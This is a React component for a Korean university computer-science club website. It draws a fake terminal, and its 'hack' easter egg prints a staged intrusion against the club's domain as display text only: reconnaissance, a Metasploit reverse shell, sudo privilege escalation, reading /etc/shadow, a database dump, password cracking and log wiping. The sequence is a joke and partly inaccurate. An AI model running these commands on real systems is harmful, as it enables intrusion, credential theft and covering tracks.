import { useState, useEffect, useRef, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';

// ── NL 정보 토큰 ─────────────────────────────────────────────
type Token = { c: string; v: string };

const COLORS: Record<string, string> = {
  cmt: '#546E7A',
  kw:  '#818CF8',
  key: '#06B6D4',
  str: '#10B981',
  num: '#F59E0B',
  op:  'rgba(255,255,255,0.55)',
  pl:  'rgba(255,255,255,0.85)',
};

const CODE_TOKENS: Token[] = [
  { c: 'cmt', v: '/**\n' },
  { c: 'cmt', v: ' * NL — ' }, { c: 'pl', v: 'Network Leader\n' },
  { c: 'cmt', v: ' * 컴퓨터공학과 학술동아리 · since ' }, { c: 'num', v: '2007\n' },
  { c: 'cmt', v: ' * 멤버 ' }, { c: 'num', v: '30' }, { c: 'cmt', v: '+명 · 스터디 · 프로젝트 · 해커톤\n' },
  { c: 'cmt', v: ' * ' }, { c: 'str', v: '"함께 배우고, 만들고, 성장하다"\n' },
  { c: 'cmt', v: ' */' },
];

type CharColor = { char: string; color: string };
const CHAR_COLORS: CharColor[] = CODE_TOKENS.flatMap(tok =>
  [...tok.v].map(char => ({ char, color: COLORS[tok.c] ?? COLORS.pl }))
);

type Line = { chars: CharColor[]; offset: number };
function buildLines(): Line[] {
  const lines: Line[] = [];
  let offset = 0;
  let current: CharColor[] = [];
  for (let i = 0; i < CHAR_COLORS.length; i++) {
    if (CHAR_COLORS[i].char === '\n') {
      lines.push({ chars: current, offset });
      offset += current.length + 1;
      current = [];
    } else {
      current.push(CHAR_COLORS[i]);
    }
  }
  if (current.length > 0) lines.push({ chars: current, offset });
  return lines;
}
const LINES = buildLines();

// ── 커맨드 정의 ──────────────────────────────────────────────
const ROUTE_MAP: Record<string, string> = {
  'cd 활동소개':  '/activity',
  'cd 임원소개':  '/executives',
  'cd 블로그':    '/blog',
  'cd 지원하기':  '/join',
  'cd activity':  '/activity',
  'cd executives':'/executives',
  'cd blog':      '/blog',
  'cd join':      '/join',
};

const HELP_LINES = [
  '사용 가능한 명령어:',
  '  cd 활동소개   — 활동소개 페이지로 이동',
  '  cd 임원소개   — 임원소개 페이지로 이동',
  '  cd 블로그     — 블로그 페이지로 이동',
  '  cd 지원하기   — 지원하기 페이지로 이동',
  '  /boot         — 인트로 애니메이션 재시작',
  '  ls            — 페이지 목록',
  '  date          — 현재 날짜 및 시간',
  '  fortune       — 랜덤 명언',
  '  cat README.md — NL 소개',
  '  hack          — ???',
  '  clear         — 터미널 초기화',
];

const LS_LINES = ['활동소개/  임원소개/  블로그/  지원하기/'];

const FORTUNE_QUOTES = [
  '"Talk is cheap. Show me the code." — Linus Torvalds',
  '"Any fool can write code that a computer can understand.\n  Good programmers write code that humans can understand." — Martin Fowler',
  '"First, solve the problem. Then, write the code." — John Johnson',
  '"Programs must be written for people to read, and only\n  incidentally for machines to execute." — Harold Abelson',
  '"The best error message is the one that never shows up." — Thomas Fuchs',
  '"Simplicity is the soul of efficiency." — Austin Freeman',
  '"Code is like humor. When you have to explain it, it\'s bad." — Cory House',
  '"Make it work, make it right, make it fast." — Kent Beck',
];

const README_LINES = [
  '# NL — Network Leader',
  '',
  '컴퓨터공학과 학술동아리, 2007년 창설.',
  '',
  '## 활동',
  '  정기 스터디     매주 진행',
  '  프로젝트        팀 단위 개발',
  '  세미나          발표·토론',
  '  해커톤          학기별 1회',
  '',
  '## 기술 스택',
  '  C++  Python  JavaScript  ...',
  '',
  '## 지원',
  '  $ cd 지원하기',
];

const HACK_SEQUENCE = [
  '── Phase 1 : Reconnaissance ─────────────────────────────',
  '$ nmap -sV -sC -T4 -p- nl.seoultech.ac.kr',
  '',
  '  PORT     STATE  SERVICE   VERSION',
  '  22/tcp   open   ssh       OpenSSH 8.9p1 Ubuntu',
  '  80/tcp   open   http      nginx 1.18.0',
  '  443/tcp  open   ssl/http  nginx 1.18.0',
  '  3306/tcp open   mysql     MySQL 8.0.32',
  '  8080/tcp open   http      Node.js Express',
  '',
  '── Phase 2 : Vulnerability Scan ─────────────────────────',
  '$ nikto -h https://nl.seoultech.ac.kr',
  '$ searchsploit nginx 1.18',
  '',
  '  [!] CVE-2021-44228  Log4Shell — JNDI injection (CVSS 10.0)',
  '  [!] CVE-2023-44487  HTTP/2 Rapid Reset — DoS',
  '  [!] /api/v1/users   — 인증 없이 접근 가능 (IDOR)',
  '',
  '── Phase 3 : Exploitation ───────────────────────────────',
  '$ msfconsole -q',
  'msf6 > use exploit/multi/misc/log4shell_header_injection',
  'msf6 > set RHOSTS nl.seoultech.ac.kr',
  'msf6 > set PAYLOAD linux/x64/shell_reverse_tcp',
  'msf6 > set LHOST 10.10.14.23',
  'msf6 > run',
  '',
  '  [*] Sending malicious JNDI payload...',
  '  [*] Reverse shell opened 10.10.14.23:4444',
  '  [+] Session 1 opened!',
  '',
  '── Phase 4 : Privilege Escalation ───────────────────────',
  '$ id',
  '  uid=33(www-data) gid=33(www-data)',
  '$ python3 -c \'import pty; pty.spawn("/bin/bash")\'',
  '$ find / -perm -4000 2>/dev/null',
  '  /usr/bin/sudo   <- SUID set',
  '$ sudo -l',
  '  (ALL) NOPASSWD: /usr/bin/python3',
  '$ sudo python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
  '# id',
  '  uid=0(root) gid=0(root)  ← root 획득',
  '',
  '── Phase 5 : Loot ───────────────────────────────────────',
  '# cat /etc/shadow | head -3',
  '  root:$6$rounds=5000$nl2007$Kx....:19800:0:99999:7:::',
  '# mysqldump -uroot nl_db > /tmp/.loot.sql',
  '  [dump complete — 2.3MB]',
  '# hashcat -m 1800 hashes.txt rockyou.txt',
  '  nl2007club → cracked in 4.2s',
  '',
  '── Phase 6 : Cover Tracks ───────────────────────────────',
  '# find /var/log -type f -exec truncate -s 0 {} \\;',
  '# history -c && unset HISTFILE',
  '# rm -f /tmp/.loot.sql /tmp/revshell',
  '  [*] Tracks cleared.',
  '',
  '─────────────────────────────────────────────────────────',
  '농담입니다 😄   NL 서버는 안전해요.',
  '보안에 관심 있다면? →  cd 지원하기',
];

type HistoryEntry = { input: string; output: string[]; isError?: boolean; isHack?: boolean };

// ── 컴포넌트 ─────────────────────────────────────────────────
export default function HeroCodeDisplay({
  onBoot,
  compact = false,
  tablet = false,
}: {
  onBoot?: () => void;
  /** 모바일 등 좁은 레이아웃에서 높이를 줄이고 스크롤바를 제거 */
  compact?: boolean;
  /** 태블릿 레이아웃에서 터미널 높이 확장 */
  tablet?: boolean;
}) {
  const navigate = useNavigate();

  // ── display 모드 (자동 타이핑)
  const visibleLines = LINES.length;
  const displayDone = true;

  // ── interactive 모드 (기본 상태)
  const [mode, setMode]       = useState<'display' | 'interactive'>('interactive');
  const [typed, setTyped]     = useState('');
  const [history, setHistory] = useState<HistoryEntry[]>([]);
  const termRef        = useRef<HTMLDivElement>(null);
  const inputRef       = useRef<HTMLInputElement>(null);
  const bodyRef        = useRef<HTMLDivElement>(null);
  const touchStartRef  = useRef<{ x: number; y: number } | null>(null);

  // 스크롤 최하단 유지
  useEffect(() => {
    if (bodyRef.current) bodyRef.current.scrollTop = bodyRef.current.scrollHeight;
  }, [history, typed, mode]);

  // 클릭 → interactive 모드 전환
  // 이미 interactive 모드면 히스토리를 유지한 채 포커스만 복원
  const handleClick = useCallback((currentMode: 'display' | 'interactive') => {
    if (currentMode === 'interactive') {
      inputRef.current?.focus();
      return;
    }
    setMode('interactive');
    setHistory([]);
    setTyped('');
    inputRef.current?.focus();
  }, []);

  // 커맨드 실행
  const runCommand = useCallback((cmd: string) => {
    const trimmed = cmd.trim();

    if (trimmed === '') {
      setHistory(h => [...h, { input: trimmed, output: [] }]);
      return;
    }

    if (trimmed === 'clear') {
      setHistory([]);
      return;
    }

    if (trimmed === '/boot') {
      setHistory(h => [...h, { input: trimmed, output: ['[launching boot sequence...]'] }]);
      setTimeout(() => onBoot?.(), 400);
      return;
    }

    if (trimmed === 'help' || trimmed === '--help') {
      setHistory(h => [...h, { input: trimmed, output: HELP_LINES }]);
      return;
    }

    if (trimmed === 'ls') {
      setHistory(h => [...h, { input: trimmed, output: LS_LINES }]);
      return;
    }

    if (trimmed === 'date') {
      setHistory(h => [...h, { input: trimmed, output: [new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul', hour12: false })] }]);
      return;
    }

    if (trimmed === 'fortune') {
      const quote = FORTUNE_QUOTES[Math.floor(Math.random() * FORTUNE_QUOTES.length)];
      setHistory(h => [...h, { input: trimmed, output: quote.split('\n') }]);
      return;
    }

    if (trimmed === 'cat README.md') {
      setHistory(h => [...h, { input: trimmed, output: README_LINES }]);
      return;
    }

    if (trimmed === 'hack') {
      setHistory(prev => {
        const entryIdx = prev.length;
        const newHistory: HistoryEntry[] = [...prev, { input: trimmed, output: [], isHack: true }];
        HACK_SEQUENCE.forEach((line, i) => {
          setTimeout(() => {
            setHistory(h => h.map((entry, j) =>
              j === entryIdx ? { ...entry, output: [...entry.output, line] } : entry
            ));
          }, i * 160);
        });
        return newHistory;
      });
      return;
    }

    const route = ROUTE_MAP[trimmed];
    if (route) {
      setHistory(h => [...h, { input: trimmed, output: [`[navigating to ${trimmed.replace('cd ', '')}...]`] }]);
      setTimeout(() => navigate(route), 500);
      return;
    }

    setHistory(h => [...h, {
      input: trimmed,
      output: [`command not found: ${trimmed}`, "type 'help' for available commands."],
      isError: true,
    }]);
  }, [navigate, onBoot]);

  // 한글 포함 모든 입력 처리 — hidden <input> 의 onChange + onKeyDown
  const handleInputChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    setTyped(e.target.value);
  }, []);

  const handleInputKeyDown = useCallback((e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Escape') {
      e.preventDefault();
      setMode('display');
      setHistory([]);
      setTyped('');
      if (inputRef.current) inputRef.current.value = '';
      return;
    }
    if (e.key === 'Enter' && !e.nativeEvent.isComposing) {
      e.preventDefault();
      const value = inputRef.current?.value ?? '';
      if (inputRef.current) inputRef.current.value = '';
      setTyped('');
      // IME 최종 커밋 후 실행되도록 microtask 뒤에 처리
      Promise.resolve().then(() => runCommand(value));
    }
  }, [runCommand]);

  const progressPct = Math.round((visibleLines / LINES.length) * 100);

  return (
    <div
      ref={termRef}
      className="rounded-xl overflow-hidden shadow-xl w-full outline-none relative"
      style={{
        background: 'rgba(13,13,24,0.96)',
        border: '1px solid rgba(255,255,255,0.10)',
        cursor: mode === 'display' ? 'pointer' : 'text',
      }}
      onClick={() => handleClick(mode)}
      onTouchStart={(e) => {
        touchStartRef.current = { x: e.touches[0].clientX, y: e.touches[0].clientY };
      }}
      onTouchEnd={(e) => {
        const start = touchStartRef.current;
        touchStartRef.current = null;
        if (!start) return;
        const dx = Math.abs(e.changedTouches[0].clientX - start.x);
        const dy = Math.abs(e.changedTouches[0].clientY - start.y);
        // 10px 이상 이동했으면 스크롤로 간주 → 포커스/히스토리 변경 없이 무시
        if (dx > 10 || dy > 10) return;
        // iOS/iPad: touchend에서 직접 focus → 키보드 표시
        e.preventDefault();
        handleClick(mode);
      }}
    >
      {/* 타이틀 바 */}
      <div className="flex items-center justify-between px-4 py-2.5 border-b border-white/10 select-none">
        <div className="flex items-center gap-1.5">
          <span className="w-2.5 h-2.5 rounded-full bg-[#FF5F57]" />
          <span className="w-2.5 h-2.5 rounded-full bg-[#FFBD2E]" />
          <span className="w-2.5 h-2.5 rounded-full bg-[#28CA41]" />
          <span className="ml-3 font-mono text-xs text-white/25">
            {mode === 'display' ? 'nl.config.ts' : 'bash — NL_NetworkLeader_CLUB'}
          </span>
        </div>
        <span className="font-mono text-[0.6rem] text-white/30">
          {mode === 'display'
            ? (displayDone ? '✓ loaded' : '● editing')
            : '▌interactive'}
        </span>
      </div>

      {/* 진행 바 (display 모드만) */}
      {mode === 'display' && (
        <div className="h-px bg-white/5">
          <div
            className="h-full bg-[#818CF8] transition-all duration-300"
            style={{ width: `${progressPct}%` }}
          />
        </div>
      )}

      {/* 바디 — 가로 스크롤 비활성화, 세로는 히스토리 확장 시만 노출 */}
      <div
        ref={bodyRef}
        className="px-5 py-4 overflow-x-hidden overflow-y-auto select-none terminal-body"
        style={{ maxHeight: compact ? '160px' : tablet ? '320px' : '230px' }}
      >
        {/* ── display 모드 ── */}
        {mode === 'display' && (
          <>
            <pre
              style={{
                fontFamily: "'JetBrains Mono', 'Courier New', Courier, monospace",
                fontSize: compact ? '0.72rem' : '0.88rem',
                lineHeight: '1.7',
                // compact(모바일)일 때 pre-wrap으로 긴 한글 라인 자동 줄바꿈
                whiteSpace: compact ? 'pre-wrap' : 'pre',
                wordBreak: compact ? 'break-word' : undefined,
                margin: 0,
              }}
            >
              {LINES.slice(0, visibleLines).map((line, lineIdx) => (
                <div
                  key={lineIdx}
                  style={{ display: 'flex', animation: 'codeLineReveal 180ms ease-out both' }}
                >
                  <span style={{
                    color: 'rgba(255,255,255,0.18)',
                    width: '1.6rem',
                    flexShrink: 0,
                    textAlign: 'right',
                    marginRight: '1rem',
                    userSelect: 'none',
                  }}>
                    {lineIdx + 1}
                  </span>
                  <span>
                    {line.chars.map((cc, ci) => (
                      <span key={ci} style={{ color: cc.color }}>
                        {cc.char === ' ' ? '\u00A0' : cc.char}
                      </span>
                    ))}
                    {!displayDone && lineIdx === visibleLines - 1 && (
                      <span
                        className="animate-pulse"
                        style={{
                          display: 'inline-block',
                          width: '0.5em',
                          height: '1em',
                          background: '#818CF8',
                          verticalAlign: 'text-bottom',
                        }}
                      />
                    )}
                  </span>
                </div>
              ))}
            </pre>
            {displayDone && (
              <p style={{
                fontFamily: "'JetBrains Mono', monospace",
                fontSize: '0.58rem',
                color: 'rgba(255,255,255,0.15)',
                marginTop: '0.75rem',
                textAlign: 'center',
              }}>
                클릭하여 터미널 열기
              </p>
            )}
          </>
        )}

        {/* ── interactive 모드 ── */}
        {mode === 'interactive' && (
          <pre
            style={{
              fontFamily: "'JetBrains Mono', 'Courier New', Courier, monospace",
              fontSize: '0.88rem',
              lineHeight: '1.65',
              whiteSpace: 'pre-wrap',
              margin: 0,
              color: 'rgba(255,255,255,0.85)',
            }}
          >
            {/* 환영 메시지 */}
            <span style={{ display: 'block', color: '#10B981' }}>
              NL Terminal — type &apos;help&apos; for commands
            </span>
            <span style={{ display: 'block', color: 'rgba(255,255,255,0.2)', marginBottom: '4px' }}>
              ─────────────────────────────────────
            </span>

            {/* 히스토리 */}
            {history.map((entry, i) => (
              <span key={i} style={{ display: 'block' }}>
                <span style={{ color: '#10B981' }}>guest@nl</span>
                <span style={{ color: 'rgba(255,255,255,0.28)' }}>:</span>
                <span style={{ color: '#818CF8' }}>~/NL_NetworkLeader_CLUB</span>
                <span style={{ color: 'rgba(255,255,255,0.38)' }}>$ </span>
                <span>{entry.input}</span>
                {entry.output.map((line, j) => (
                  <span key={j} style={{
                    display: 'block',
                    color: entry.isError
                      ? '#F87171'
                      : entry.isHack
                        ? line.startsWith('──')               ? '#818CF8'
                        : line.startsWith('  [+]')            ? '#10B981'
                        : line.startsWith('  [!]')            ? '#F59E0B'
                        : line.startsWith('  [*]')            ? '#06B6D4'
                        : line.includes('root 획득')           ? '#10B981'
                        : line.startsWith('msf6')             ? '#A78BFA'
                        : line.startsWith('  uid=0')          ? '#10B981'
                        : line.startsWith('#')                ? '#F87171'
                        : line.startsWith('$')                ? '#818CF8'
                        : line.includes('cracked')            ? '#10B981'
                        : line.includes('농담')|| line.includes('해킹') ? '#F59E0B'
                        : 'rgba(255,255,255,0.65)'
                      : 'rgba(255,255,255,0.5)',
                    paddingLeft: '1ch',
                    fontFamily: "'JetBrains Mono', monospace",
                  }}>
                    {line || '\u00A0'}
                  </span>
                ))}
              </span>
            ))}

            {/* 현재 입력 줄 */}
            <span style={{ display: 'block' }}>
              <span style={{ color: '#10B981' }}>guest@nl</span>
              <span style={{ color: 'rgba(255,255,255,0.28)' }}>:</span>
              <span style={{ color: '#818CF8' }}>~/NL_NetworkLeader_CLUB</span>
              <span style={{ color: 'rgba(255,255,255,0.38)' }}>$ </span>
              <span>{typed}</span>
              <span
                className="animate-pulse"
                style={{
                  display: 'inline-block',
                  width: '0.52em',
                  height: '1em',
                  background: '#818CF8',
                  verticalAlign: 'text-bottom',
                  marginLeft: '1px',
                }}
              />
            </span>
          </pre>
        )}
      </div>

      {/* 한글 IME + 터치 키보드 지원용 숨겨진 input
          항상 마운트: iOS/iPad에서 focus()는 DOM에 이미 존재하는 요소에만 동작.
          position: absolute + overflow:hidden으로 시각적으로 숨김.
          fontSize: 16px — iOS Safari가 <16px input에 자동 zoom 하는 것 방지. */}
      <input
        ref={inputRef}
        onChange={handleInputChange}
        onKeyDown={handleInputKeyDown}
        tabIndex={mode === 'interactive' ? 0 : -1}
        style={{
          position: 'absolute',
          top: 0,
          left: 0,
          width: '1px',
          height: '1px',
          opacity: 0,
          border: 'none',
          padding: 0,
          margin: 0,
          fontSize: '16px',
          pointerEvents: 'none',
        }}
        autoComplete="off"
        autoCorrect="off"
        autoCapitalize="off"
        spellCheck={false}
      />
    </div>
  );
}
